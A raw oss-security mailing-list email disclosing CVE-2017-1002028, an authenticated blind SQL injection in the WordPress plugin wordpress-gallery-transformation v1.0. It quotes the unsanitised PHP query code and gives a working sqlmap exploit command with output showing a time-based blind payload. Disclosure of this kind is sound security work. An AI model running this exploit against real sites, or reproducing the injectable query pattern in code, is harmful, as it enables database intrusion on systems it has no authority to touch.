X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["2274" "Friday" "25" "August" "2017" "12:03:02" "-0400" "Larry W. Cashdollar" "larry0@me.com" "<29FBF111-3395-49B0-8A35-4E6D36963175@me.com>" "59" "[oss-security] Blind SQL Injection in Wordpress plugin wordpress-gallery-transformation v1.0" nil nil nil "8" "2017082516:03:02" "[oss-security] Blind SQL Injection in Wordpress plugin wordpress-gallery-transformation v1.0" (number mark "U       larry0@me.co Aug 25   59/2274  " thread-indent "\"[oss-security] Blind SQL Injection in Wordpress plugin wordpress-gallery-transformation v1.0\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 32233 invoked by uid 550); 25 Aug 2017 16:04:19 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 31891 invoked from network); 25 Aug 2017 16:03:55 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=me.com; s=04042017;
	t=1503676984; bh=VQl9nIHqIya8RtXp0yKfo+jBGVfi2l1CWJSZ4M4ZP5E=;
	h=From:Content-type:MIME-version:Subject:Message-id:Date:To;
	b=IGTK93qF8YaSDsucQOnwMNGVd5HK+Ru0UvhsiKIrEu8k4vhAJYDrftqs6pnfVXWma
 DvH+pYj2sFcSGP5mHYpgh7wJOzQthu+jCQXbMVLyzhf0T1qRlUvdwE53qwNdbNlpeC
 JhxvD628e+oB7LEQ71rTJakQNRFzjQp+mTRlZOaOG3gzq1YHFvjL+xvsCT/M6behxw
 3pYhZO+KMDO+cnmZC1su/5X8v9+hPVlBYdBiUH9qclWxsThNGq+ok/WDXSKAzYfkqO
 w7/jekLBQiNnZjamkm92a0GcE2WpW914+1QMGfClvTLUbkaX7sJzMCEyBFcTtgcGnl
 AgXb1YfHbQlKg==
X-Proofpoint-Virus-Version: vendor=fsecure engine=2.50.10432:,,
 definitions=2017-08-25_04:,, signatures=0
X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 spamscore=0
 clxscore=1015 suspectscore=0 malwarescore=0 phishscore=0 adultscore=0
 bulkscore=0 classifier=spam adjust=0 reason=mlx scancount=1
 engine=8.0.1-1707230000 definitions=main-1708250240
From: "Larry W. Cashdollar" <larry0@me.com>
Content-type: text/plain; charset=utf-8
Content-transfer-encoding: quoted-printable
MIME-version: 1.0 (Mac OS X Mail 10.3 \(3273\))
Message-id: <29FBF111-3395-49B0-8A35-4E6D36963175@me.com>
Date: Fri, 25 Aug 2017 12:03:02 -0400
To: Open Source Security <oss-security@lists.openwall.com>
X-Mailer: Apple Mail (2.3273)
Subject: [oss-security] Blind SQL Injection in Wordpress plugin
 wordpress-gallery-transformation v1.0

Title: Authenticated Blind SQL Injection in Wordpress plugin wordpress-gall=
ery-transformation v1.0
Author: Larry W. Cashdollar, @_larry0
Date: 2017-07-22
CVE-ID:[CVE-2017-1002028]
Download Site: https://wordpress.org/plugins/wordpress-gallery-transformati=
on/
Vendor: http://angrybyte.com
Vendor Notified: 2017-08-07
Vendor Contact: plugins@wordpress.org
Advisory: http://www.vapidlabs.com/advisory.php?v=3D199
Description: Transforms word press into a gallery, wallpapers website, you =
name it.
Vulnerability:
SQL injection is in ./wordpress-gallery-transformation/gallery.php via $jpi=
c parameter being unsanitized before being passed into an SQL query.

--
231-
232- $pfx=3D$wpdb->prefix;
233-dbcreator();
234- if($_GET['picnj']){
235-
236: $jpic=3D$_GET['picnj'];
237: $jnm=3D$_GET['nmj'];
238- $wpdb->query("update {$pfx}gallery set name=3D'{$jnm}' where id=3D$jpi=
c;");
239- $wpdb->query("update {$pfx}gallery set rates=3D44");
240- return 'ok?';

The attacker will need to be logged in and able to manage the gallery in or=
der to exploit.

Exploit Code:
	=E2=80=A2 $ sqlmap --load-cookies=3D./cookie -u 'http://example.com/wp-adm=
in/options-general.php?page=3Dwordpress-gallery-transformation/gallery.php&=
picnj=3D*' --level 4 --risk 3 --dbms mysql
	=E2=80=A2=20=20
	=E2=80=A2=20=20
	=E2=80=A2 URI parameter '#1*' is vulnerable. Do you want to keep testing t=
he others (if any)? [y/N]=20
	=E2=80=A2 sqlmap identified the following injection point(s) with a total =
of 2556 HTTP(s) requests:
	=E2=80=A2 ---
	=E2=80=A2 Parameter: #1* (URI)
	=E2=80=A2    Type: AND/OR time-based blind
	=E2=80=A2    Title: MySQL >=3D 5.0.12 time-based blind - Parameter replace
	=E2=80=A2    Payload: http://example.com:80/wp-admin/options-general.php?p=
age=3Dwordpress-gallery-transformation/gallery.php&picnj=3D(CASE WHEN (4165=
=3D4165) THEN SLEEP(5) ELSE 4165 END)
	=E2=80=A2 ---
	=E2=80=A2 [13:16:53] [INFO] the back-end DBMS is MySQL
	=E2=80=A2 web server operating system: Linux Ubuntu 16.04 (xenial)
	=E2=80=A2 web application technology: Apache 2.4.18
	=E2=80=A2 back-end DBMS: MySQL >=3D 5.0.12
	=E2=80=A2 [13:16:53] [INFO] fetched data logged to text files under '/home=
/larry/.sqlmap/output/example.com'
	=E2=80=A2=20=20
	=E2=80=A2 [*] shutting down at 13:16:53=
